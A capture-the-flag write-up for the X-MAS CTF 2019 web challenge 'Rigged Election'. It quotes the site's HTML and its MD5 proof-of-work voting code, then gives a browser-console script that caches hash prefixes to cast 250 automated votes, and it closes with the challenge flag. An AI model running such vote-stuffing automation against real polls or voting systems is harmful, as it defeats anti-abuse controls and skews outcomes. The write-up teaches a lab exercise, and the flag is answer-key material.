@@ -1,0 +1,200 @@
+<h1>X-MAS CTF 2019 – Rigged Election</h1>
+
+<ul>
+<li><strong>Category:</strong> web</li>
+<li><strong>Points:</strong> 50</li>
+</ul>
+
+<h2>Challenge</h2>
+
+<blockquote>
+  <p>Come one, come all! We've opened up a brand new website that allows the Lapland people to vote the next big town hall project! Just upload your ideas on the platform and vote using your CPU power. We've made sure voting takes a great amount of effort, so there's no easy way to play the system.</p>
+  
+  <p>If you are indeed able to vote more than 250 times, you will be congratulated as an active Lapland citizen and receive a prize worthy of this title.</p>
+  
+  <p>Remote server: http://challs.xmas.htsp.ro:11001</p>
+  
+  <p>Author: Milkdrop</p>
+  
+  <p>Note: The ideas you post are public and logged, posting any X-MAS flags may &gt; disqualify your team</p>
+  
+  <p>Note 2: You must send all 250 votes from the same PHP session, otherwise the server will not be able to send you the flag.</p>
+</blockquote>
+
+<h2>Solution</h2>
+
+<p>With the website you can submit an idea. An ID is assigned to that idea and the idea can be voted.</p>
+
+<p>Here the HTML source.</p>
+
+<p>```html
+<head>
+    <link rel="stylesheet" type="text/css" href="style.css">
+</head></p>
+
+<p><body>
+    <div class="container">
+        <div id="status" class="status invisible"></div></p>
+
+<pre><code>    &lt;img src="/img/idea.gif"&gt;
+    &lt;h1 class="head"&gt; Idea Voting System &lt;/h1&gt;
+    &lt;img src="/img/idea.gif"&gt;
+
+    &lt;h2&gt;&lt;i&gt;Submit your idea:&lt;/i&gt;&lt;/h2&gt;
+    &lt;form style="padding-left: 35px" action="/" name="newIdea" method="post"&gt;
+        &lt;textarea maxlength="31" style="margin-right: 45px; margin-bottom: 5px; height: 25px" placeholder="Name" cols="30" rows ="1" name="name"&gt;&lt;/textarea&gt;&lt;br&gt;
+        &lt;textarea maxlength="255" placeholder="I think that we should do X, because Y ..." cols="30" rows ="5" name="idea"&gt;&lt;/textarea&gt;
+        &lt;input class="submitButton" type="submit" value=""&gt;
+    &lt;/form&gt;
+
+    &lt;div class="idea special"&gt;&lt;b class="name"&gt;name&lt;/b&gt; / 123456 Points&lt;div class="vote"&gt;
+                    &lt;div class="agree" onclick="vote(16773, 1)"&gt;(I agree)&lt;/div&gt; / 
+                    &lt;div class="disagree" onclick="vote(16773, 0)"&gt;(I disagree)&lt;/div&gt;
+                &lt;/div&gt;&lt;div class="ideaText"&gt;Idea text.&lt;/div&gt;&lt;/div&gt;
+    &lt;footer&gt;
+        As seen on Good Morning America
+    &lt;/footer&gt;
+
+    &lt;script src="/md5.js"&gt;&lt;/script&gt;
+    &lt;script src="/index.js"&gt;&lt;/script&gt;
+&lt;/div&gt;
+</code></pre>
+
+<p></body>
+```</p>
+
+<p>The JavaScript into <code>index.js</code> is the following.</p>
+
+<p>```javascript
+function generateRandom (length) {
+    var result = '';
+    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var charactersLength = characters.length;</p>
+
+<pre><code>for (var i = 0; i &lt; length; i++)
+    result += characters.charAt (Math.floor (Math.random () * charactersLength));
+
+return result;
+</code></pre>
+
+<p>}</p>
+
+<p>function vote (id, upvote) {
+    var xhttp = new XMLHttpRequest ();
+    xhttp.open ("GET", "/vote.php?g=1", false);
+    xhttp.send ();
+    var work = xhttp.responseText;</p>
+
+<pre><code>var statusElement = document.getElementById ("status");
+statusElement.className = "status";
+statusElement.innerText = "CPU Voting on Idea #" + id + " ...";
+
+var found = false;
+while (!found) {
+    var randomLength = Math.floor (7 + Math.random () * 18);
+    var stringGen = generateRandom (randomLength);
+    var md5Gen = md5 ("watch__bisqwit__" + stringGen);
+
+    if (md5Gen.substring (0, work.length).localeCompare (work) === 0) {
+        var url = "/vote.php?id=" + id + "&amp;h=" + stringGen;
+        if (upvote === 1)
+            url += "&amp;u=1";
+
+        xhttp.open ("GET", url, false);
+        xhttp.send ();
+        found = true;
+    }
+}
+
+location.href = "/";
+</code></pre>
+
+<p>}
+```</p>
+
+<p>The voting procedure requires that a sort of challenge is returned by the server after the first request, i.e. <code>xhttp.open ("GET", "/vote.php?g=1", false);</code>, and then the client has to find a string which produces a MD5 hash with the first characters equals to the challenge. The challenge is different each time.</p>
+
+<p>To reduce the time of finding correct strings, a smart voter can be implemented, using a cache and storing all failed attempts. With this trick, after ~14M  requests all strings will be found inside the cache, reducing the time of generation.</p>
+
+<p>The exploit is the following.</p>
+
+<p>```javascript
+function wait(ms) {
+    var d = new Date();
+    var d2 = null;
+    do {
+        d2 = new Date(); 
+    } while(d2-d &lt; ms);
+}</p>
+
+<p>function voteSmart(id) {</p>
+
+<pre><code>const cacheLimit = 90000000;
+var cacheElements = 0;
+var cache = new Map();
+
+console.log("Start voting.");
+var votes = 0
+while(votes &lt;= 250) {
+
+    console.log("Cookies: " + document.cookie);
+
+    var xhttp = new XMLHttpRequest ();
+    xhttp.open ("GET", "/vote.php?g=1", false);
+    xhttp.send ();
+    work = xhttp.responseText;
+    console.log("Work to find is: " + work);
+
+    stringGen = "";
+    if(work in cache) {
+        console.log("Cache hit!");
+        stringGen = cache[work];
+        wait(1000);
+    } else {
+
+        var found = false;
+        while(!found) {
+            var randomLength = Math.floor(7 + Math.random () * 18);
+            stringGen = generateRandom(randomLength);
+            var md5Gen = md5("watch__bisqwit__" + stringGen);
+            var md5Subs = md5Gen.substring(0, work.length);
+
+            if(cacheElements &lt; cacheLimit &amp;&amp; !(md5Subs in cache)) { // Updating cache at runtime.
+                cache[md5Subs] = stringGen;
+                cacheElements++;
+                if(cacheElements % 1000000 == 0) {
+                    console.log("There are " + cacheElements + " cache elements.")
+                }
+            }
+
+            if(md5Subs.localeCompare(work) === 0) {
+                found = true;
+            }
+        }
+    }
+
+    var url = "/vote.php?id=" + id + "&amp;h=" + stringGen + "&amp;u=1";
+    xhttp.open ("GET", url, false);
+    xhttp.send ();
+    voteResult = xhttp.responseText;
+    votes++;
+    console.log(votes + " &gt; " + voteResult);
+
+    if(voteResult.includes("X-MAS{")) {
+        alert(voteResult);
+        break;
+    }
+
+}
+</code></pre>
+
+<p>}</p>
+
+<p>voteSmart(23148);
+```</p>
+
+<p>You can launch the exploit script into the browser console and then refresh the page to get the flag.</p>
+
+<p><code>
+X-MAS{NASA_aint_got_n0thin_on_m3}
+</code></p>
